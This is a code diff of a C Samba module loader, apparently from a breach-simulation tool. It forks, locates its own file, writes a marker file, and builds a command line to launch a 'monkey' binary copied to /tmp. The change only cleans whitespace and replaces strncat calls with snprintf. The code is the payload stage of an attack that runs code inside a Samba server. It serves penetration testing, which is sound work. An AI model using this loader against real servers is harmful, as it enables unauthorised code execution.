@@ -32,7 +32,7 @@ int samba_init_module(void)
 	const char RUN_MONKEY_CMD[] = "./";
 	const char MONKEY_DEST_FOLDER[] = "/tmp";
 	const char MONKEY_DEST_NAME[] = "monkey";
-	
+
 	int found = 0;
 	char modulePathLine[LINE_MAX_LENGTH] = {'\0'};
 	char commandline[LINE_MAX_LENGTH] = {'\0'};
@@ -43,22 +43,22 @@ int samba_init_module(void)
 	int monkeySize = 0;
 	void* monkeyBinary = NULL;
 	struct stat fileStats;
-	
+
 	pid = fork();
-	
+
 	if (0 != pid)
 	{
 		// error or this is parent - nothing to do but return.
 		return 0;
 	}
-	
+
 	// Find fullpath of running module.
 	pFile = fopen("/proc/self/maps", "r");
 	if (NULL == pFile)
 	{
 		return 0;
 	}
-	
+
 	while (fgets(modulePathLine, LINE_MAX_LENGTH, pFile) != NULL) {
 		fileNamePointer = strstr(modulePathLine, RUNNER_FILENAME);
         if (fileNamePointer != NULL) {
@@ -66,44 +66,42 @@ int samba_init_module(void)
 			break;
         }
 	}
-	
+
 	fclose(pFile);
-	
+
 	// We can't find ourselves in module list
 	if (0 == found)
 	{
 		return 0;
 	}
-	
+
 	monkeyDirectory = strchr(modulePathLine, '/');
 	*fileNamePointer = '\0';
-	
+
 	if (0 != chdir(monkeyDirectory))
 	{
 		return 0;
 	}
-	
+
 	// Write file to indicate we're running
 	pFile = fopen(RUNNER_RESULT_FILENAME, "w");
 	if (NULL == pFile)
 	{
 		return 0;
 	}
-	
+
 	fwrite(monkeyDirectory, 1, strlen(monkeyDirectory), pFile);
 	fclose(pFile);
-	
+
 	// Read commandline
 	pFile = fopen(COMMANDLINE_FILENAME, "r");
 	if (NULL == pFile)
 	{
 		return 0;
 	}
-	
+
 	// Build commandline
-	strncat(commandline, RUN_MONKEY_CMD, sizeof(RUN_MONKEY_CMD) - 1);
-	strncat(commandline, MONKEY_DEST_NAME, sizeof(MONKEY_DEST_NAME) - 1);
-	strncat(commandline, " ", 1);
+	snprintf(commandline, sizeof(commandline), "%s%s ", RUN_MONKEY_CMD, MONKEY_DEST_NAME);
 	
 	fread(commandline + strlen(commandline), 1, LINE_MAX_LENGTH, pFile);
 	fclose(pFile);
